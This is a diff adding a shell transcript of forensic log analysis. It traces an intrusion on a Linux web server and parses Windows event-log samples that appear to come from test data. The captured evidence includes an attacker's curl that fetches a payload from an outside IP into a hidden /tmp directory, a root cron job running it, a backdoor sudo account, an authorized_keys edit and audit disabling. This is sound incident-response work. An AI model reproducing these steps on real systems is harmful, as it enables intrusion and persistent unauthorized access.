@@ -1,0 +1,52 @@
+$ cd vu14/logsrv/web01 && grep -oE 'sudo: +\S+ : .*COMMAND=.*' auth-syslog.log | sed -E 's/TTY=\S+ ; PWD=\S+ ; //' | sort | uniq -c | sort -rn
+     20 sudo:   deploy : USER=root ; COMMAND=/usr/bin/systemctl restart shop
+      1 sudo:   deploy : USER=root ; COMMAND=/usr/bin/bash
+      1 sudo:       an : USER=root ; COMMAND=/usr/bin/systemctl restart rsyslog
+$ cd vu14/logsrv/web01 && grep -E 'useradd|usermod|chpasswd|groupadd' auth-syslog.log | cut -c1-19,33-
+2026-11-19T02:16:02 web01 useradd[3045321]: new group: name=sysupdate, GID=1003
+2026-11-19T02:16:02 web01 useradd[3045321]: new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1
+2026-11-19T02:16:05 web01 usermod[3045325]: add 'sysupdate' to group 'sudo'
+2026-11-19T02:16:05 web01 usermod[3045325]: add 'sysupdate' to shadow group 'sudo'
+2026-11-19T02:16:11 web01 chpasswd[3045328]: pam_unix(chpasswd:chauthtok): password changed for sysupdate
+$ cd vu14/web01/var/log/audit && grep -oE 'key="[^"]+"' audit.log | sort | uniq -c
+      1 key="cron"
+      1 key="ssh_keys"
+      1 key="systemd"
+      1 key="tai_ve"
+$ cd vu14/web01/var/log/audit && awk '/key="(ssh_keys|tai_ve|cron|systemd)"/ {match($0, /audit\([0-9.]+:[0-9]+\)/); id = substr($0, RSTART, RLENGTH); k[id] = $0} /^type=(PATH|EXECVE)/ {match($0, /audit\([0-9.]+:[0-9]+\)/); id = substr($0, RSTART, RLENGTH); if (id in k) {split(id, a, /[(:.]/); match(k[id], /key="[^"]+"/); kk = substr(k[id], RSTART, RLENGTH); match(k[id], /auid=[0-9]+/); au = substr(k[id], RSTART, RLENGTH); match(k[id], /comm="[^"]+"/); cm = substr(k[id], RSTART, RLENGTH); sub(/^type=[A-Z]+ msg=audit\([0-9.:]+\): /, ""); print a[2], kk, au, cm, $0}}' audit.log | while read e r; do echo "$(TZ='<+07>-7' date -d @$e +%H:%M:%S) $r" | cut -c1-150; done
+02:17:10 key="ssh_keys" auid=1001 comm="bash" item=1 name="/root/.ssh/authorized_keys" inode=262411 dev=fd:01 mode=0100600 ouid=0 ogid=0 nametype=CREA
+02:18:40 key="tai_ve" auid=1001 comm="curl" argc=5 a0="curl" a1="-so" a2="/tmp/.x/kworkerd" a3="http://203.0.113.77:8000/k" a4="--create-dirs"
+02:19:05 key="cron" auid=1001 comm="bash" item=1 name="/etc/cron.d/dbus-sync" inode=262433 dev=fd:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE
+02:20:12 key="systemd" auid=1001 comm="bash" item=1 name="/etc/systemd/system/dbus-sync.service" inode=262440 dev=fd:01 mode=0100644 ouid=0 ogid=0 nam
+$ cd vu14/web01/var/log/audit && grep -E 'CONFIG_CHANGE|ADD_USER|ADD_GROUP|USER_CMD' audit.log | while read l; do e=$(echo "$l" | grep -oE 'audit\([0-9]+' | tr -dc 0-9); echo "$(TZ='<+07>-7' date -d @$e '+%d/%m %H:%M:%S') ${l%% msg=*} $(echo "$l" | grep -oE "(op=[a-z-]+|audit_enabled=[0-9]+|old=[0-9]+|auid=[0-9]+|acct=\"[^\"]+\"|grp=\"[^\"]+\"|cmd=\"[^\"]+\")" | tr '\n' ' ')"; done
+19/11 02:15:03 type=USER_CMD auid=1001 cmd="bash"
+19/11 02:16:02 type=ADD_USER auid=1001 op=add-user
+19/11 02:16:05 type=ADD_GROUP auid=1001 op=add-user-to-group grp="sudo" acct="sysupdate"
+19/11 02:22:30 type=CONFIG_CHANGE op=set audit_enabled=0 old=1 auid=1001
+19/11 09:29:31 type=CONFIG_CHANGE op=set audit_enabled=1 old=0 auid=1000
+$ cd vu14/web01/var/log && grep -E 'dbus-sync|kworkerd' syslog | head -n 4; grep -c 'kworkerd' syslog
+2026-11-19T02:20:15.017226+07:00 web01 systemd[1]: Started dbus-sync.service - D-Bus session sync helper.
+2026-11-19T02:25:01.027286+07:00 web01 CRON[3046752]: (root) CMD (/tmp/.x/kworkerd -q >/dev/null 2>&1)
+2026-11-19T02:30:01.019797+07:00 web01 CRON[3047502]: (root) CMD (/tmp/.x/kworkerd -q >/dev/null 2>&1)
+2026-11-19T02:35:01.028768+07:00 web01 CRON[3048252]: (root) CMD (/tmp/.x/kworkerd -q >/dev/null 2>&1)
+110
+$ cd vu14/thu-thap && sed -n '/cron.d/,/kworkerd -q/p' stat.txt
+web01:~$ cat /etc/cron.d/dbus-sync
+*/5 * * * * root /tmp/.x/kworkerd -q >/dev/null 2>&1
+$ evtx-rec tc/user-4720.evtx tc/admin-4732.evtx | jq -r '[.t[0:19], .may, .id, .data.TargetUserName, .data.SamAccountName, .data.MemberSid, .data.SubjectUserName] | @tsv' | sort -u
+2020-07-12T05:12:58	jump01.offsec.lan	4720	hacking-local-acct	hacking-local-acct		admmig
+2020-07-12T05:12:58	jump01.offsec.lan	4732	Users		S-1-5-21-1470532092-3758209836-3742276719-1001	admmig
+2020-07-12T05:14:30	jump01.offsec.lan	4732	Administrators		S-1-5-21-1470532092-3758209836-3742276719-1001	admmig
+2020-07-12T05:14:44	jump01.offsec.lan	4732	Backup Operators		S-1-5-21-1470532092-3758209836-3742276719-1001	admmig
+$ evtx-rec tc/apt-4720-4698.evtx | jq -r '[.t[0:19], .id, .data.TargetUserName // .data.TaskName, .data.SubjectUserName] | @tsv'
+2021-06-01T14:06:34	4720	WADGUtilityAccount	admmig
+2021-06-01T14:08:21	4720	elie	admmig
+2021-06-01T14:09:38	4698	\\Microsoft\\SynchronizeTimeZone	admmig
+$ evtx-rec tc/apt-4720-4698.evtx | jq -r 'select(.id == 4698) | .data.TaskContent' | grep -oE '<(Command|Arguments|UserId|RunLevel)>[^<]*' | cut -c1-120
+<RunLevel>LeastPrivilege
+<UserId>OFFSEC\admmig
+<Command>adf
+$ evtx-rec tc/svc-7045.evtx | jq -r 'select(.id == 7045) | [.t[0:19], .may, .data.ServiceName, .data.ImagePath, .data.StartType, .data.AccountName] | @tsv'
+2020-07-11T21:50:07	fs02.offsec.lan	bad-task	virusé.exe	demand start	LocalSystem
+$ evtx-rec tc/runkey-sysmon13.evtx | jq -r '[.t[0:19], .data.Image, .data.TargetObject, .data.Details] | @tsv'
+2020-07-04T14:18:58	C:\\Users\\Public\\tools\\evasion\\a.exe	HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\	"c:\\windows\\tasks\\taskhost.exe"
